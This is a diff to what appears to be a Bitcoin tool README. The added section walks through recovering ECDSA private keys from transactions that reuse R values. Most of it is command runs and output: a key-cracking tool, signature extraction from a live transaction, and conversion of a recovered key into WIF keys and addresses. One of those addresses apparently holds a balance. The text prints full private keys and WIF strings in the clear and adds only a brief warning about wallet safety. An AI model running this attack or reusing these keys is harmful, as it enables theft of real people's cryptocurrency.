@@ -204,8 +204,129 @@ R : e3fac5013cb64da897797a9aea58e8eeb5f49388f3c30a7a2c9dc16144722d79
 S : 48f35443bf7153b211426355ac2aa528c44f3dcaa21bac87c39d059090eeae99
 Z : dfe7ed29489932a243e1812511eb143be5d7622c775cdffe41de202b472431fe
 
+# crack_keys The obtained data is then run the batch search duplicate R script program.
+
+Run in the data directory, the program script will read. 
+./crack_keys
+
+./crack_keys
+Scanning directory: /home/test
+Found 1 files. Starting 8 worker threads...
+
+All threads finished.
+
+Success! Private keys have been found.
+  - Detailed logs written to: found_keys.txt
+  - Private keys only written to: private_keys_only.txt
+    
+
+found_keys.txt The output is as follows.
+
+====== Private Key Found! ======
+Private Key: f1f2f43b4a197650e05eada740d6b0a7bb01628d29052a40a1428d425c06437d
+------
+[Source 1]
+ID: 19d66411a5aa716a04b37197c11c93c9446a54694a2d2302093d8b0a93ed5d83
+R : cabc3692f1f7ba75a8572dc5d270b35bcc00650534f6e5ecd6338e55355454d5
+S : 0437b68b1ea23546f6f712fd6a7e5370cfc2e658a8f0245628afd8b6999d9da6
+Z : 109a80161c75f67ff6b98166b061e82e4b739ee8cac2820f173ab8b1f9991242
+------
+[Source 2]
+ID: c6b32e0c2c3798f8c72ee21e41846d3d872586a96d8a1e277d7666c6666dfb4c
+R : cabc3692f1f7ba75a8572dc5d270b35bcc00650534f6e5ecd6338e55355454d5
+S : 09ddb766ace47385fb2a7846b09357df890e339248a6e436242f703f530e54d1
+Z : fc9d8609145a57371932f482c20c134bd7fd3478b66ad430be46c2942101e2ba
+
+.
+.
+.
+====== Private Key Found! ======
+Private Key: c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
+------
+[Source 1]
+ID: 2229e4d6a7216690050341c35b5641f18ceb881033c332796ea12e1924c377af
+R : d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1
+S : 90d1b50635e4eaca683c32266205f5b0429c9a7669659c4e5eba032658d6394c
+Z : 01ec1a3f62f35a3f0489f03983ce4ad8e7d89bdb3194baeb68d1a29cae4a6203
+------
+[Source 2]
+ID: 2b42bc109492cc3f99142e8c2ee7c06cacea675409f26132ac9ced0263c5d9b8
+R : d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1
+S : e23cc95260e55cb21e9946181c6995848c5def6a4e48db8cd1e483771a0cb9ea
+Z : fc24f4554d719cf0beb70ab05fe6cd5145cfb9a86972f322deee43f4020b4be9
+
+private_keys_only.txt The output is as follows.
+
+f1f2f43b4a197650e05eada740d6b0a7bb01628d29052a40a1428d425c06437d
+.
+.
+.
+
+c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
+
+Analyzing these data, we can find that as long as the program script is not fully tested, it is possible to reuse the R value, which will lead to the private key being attacked and leaked. When using a wallet in daily life, you must fully understand the credibility of the wallet and choose a wallet that has been verified for security.
+
+# Let’s verify the data below
+
+https://btc.exan.tech/tx/2b42bc109492cc3f99142e8c2ee7c06cacea675409f26132ac9ced0263c5d9b8
+
+./extract_rszp -h
+Usage: ./extract_rszp <option> <value>
+Options:
+  -d <txid>    txid of the transaction. Automatically fetch rawtx.
+  -x <rawtx>   Raw Transaction on the blockchain.
+
+ ./extract_rszp -d 2b42bc109492cc3f99142e8c2ee7c06cacea675409f26132ac9ced0263c5d9b8
+Fetching rawtx for txid: 2b42bc109492cc3f99142e8c2ee7c06cacea675409f26132ac9ced0263c5d9b8 ...
+
+Starting Program...
+======================================================================
+[Input Index #: 0]
+     R: d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1
+     S: e23cc95260e55cb21e9946181c6995848c5def6a4e48db8cd1e483771a0cb9ea
+     Z: fc24f4554d719cf0beb70ab05fe6cd5145cfb9a86972f322deee43f4020b4be9
+PubKey: 04dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ff
+
+./extract_rszp -x 0100000001445c9b1db04a8fd1f5626a2ada5033e5fd57bfd05eb0ddb499bfdc7f0d39925b010000008a4730440220d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad10220e23cc95260e55cb21e9946181c6995848c5def6a4e48db8cd1e483771a0cb9ea014104dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ffffffffff01f0490200000000001976a914019453ca35e7cdc43118dda7bc81ee981bd6f92488ac00000000
+
+Starting Program...
+======================================================================
+[Input Index #: 0]
+     R: d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1
+     S: e23cc95260e55cb21e9946181c6995848c5def6a4e48db8cd1e483771a0cb9ea
+     Z: fc24f4554d719cf0beb70ab05fe6cd5145cfb9a86972f322deee43f4020b4be9
+PubKey: 04dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ff
 
 
+The attack recovered the private key and after checking, it was found that there had been a large number of transactions.
+
+./skey c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
+Input Private Key (Hex): c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
+Private Key (Hex, 32 bytes): c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
+WIF (Uncompressed): 5KJp7KEffR7HHFWSFYjiCUAntRSTY69LAQEX1AUzaSBHHFdKEpQ
+WIF (Compressed):   L3ocvsVKeZQirj2vTD5WqcvDXxsN8DhmaVYfRirZ8a8NrXpbcF4R
+
+Public Key (Compressed,   33 bytes): 03dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81
+Public Key (Uncompressed, 65 bytes): 04dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ff
+
+=== Addresses Generated from Compressed Public Key ===
+P2PKH:        1CkGXcY4eYCJ5QjcxF7WmhXG3dhzbAg2Kk
+P2SH-P2WPKH:  38eG2mvgVFCvCWYmvee5vDaYGuUbNHByvK
+BECH32:       bc1qsrvrkcpazsrsd5x99z27llk3sa0szf8v8p8xft
+P2WSH-P2WPKH: bc1q8dxfswvvzjg52efdsfwxqq70xga85flmpncfez2ewg65qrc9vw9qtrvvmp
+
+=== Addresses Generated from Uncompressed Public Key ===
+P2PKH:        1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm
+P2SH-P2WPKH:  3CkyhPfgDiifVpZM6YMyTfFoiD4deoCNa2 (Note: Non-standard)
+BECH32:       bc1qwpujld62thm5twkq0hm0uqs0suwtk2fm7ec7jv (Note: Non-standard)
+P2WSH-P2WPKH: bc1qs2swmd4jwajffz0sdfxvgpjjzmsekcvajjq8g0w8mmfrhjp3k7qq3jjt4r (Note: Non-standard)
+
+
+Bitcoin Address:
+```
+1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm   0.1638814 184
+```
+These leaked private keys may be BTC lost due to attacks.
 
 
 # Sponsorship
